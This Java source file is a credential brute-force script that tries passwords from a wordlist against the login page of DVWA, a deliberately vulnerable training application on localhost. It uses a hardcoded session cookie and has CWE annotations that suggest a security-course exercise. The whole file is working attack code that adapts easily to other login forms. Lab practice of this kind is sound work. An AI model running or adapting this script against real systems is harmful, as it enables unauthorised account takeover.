package org.elancev;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.util.List;
import java.util.Optional;
import java.util.Scanner;

public class Main {

    public static String bruteForce(String login) throws IOException {
        Scanner scanner = new Scanner(Main.class.getClassLoader().getResourceAsStream("passwords.txt"));

        while (scanner.hasNextLine()) {
            String password = scanner.nextLine();

            // CWE-798: Use of Hard-coded Credentials
            // CWE-1046: Creation of Immutable Text Using String Concatenation
            URL url = new URL("http://localhost/DVWA/vulnerabilities/brute/" +
                    "?username=" + login +
                    "&password=" + password +
                    "&Login=Login#");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("GET");

            con = (HttpURLConnection) url.openConnection();
            // CWE-798: Use of Hard-coded Credentials
            con.setRequestProperty("Cookie", "PHPSESSID=g0dl7epevn8flse46svq81looj;security=low");

            try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));) {
                StringBuilder str = new StringBuilder();
                String temp;
                while ((temp = in.readLine()) != null) {
                    str.append(temp);
                }
                // Slow check substring
                if (str.toString().contains("Welcome to the password protected area " + login))
                    return password;
            } catch (Exception ignored) {

            }
        }
        return null;
    }

    public static void main(String[] args) throws IOException {

        String psd = bruteForce("admin");
        if (psd == null) {
            System.out.println("Password not found");
        }
        else {
            System.out.println("Password is '" + psd + "'");
        }
    }
}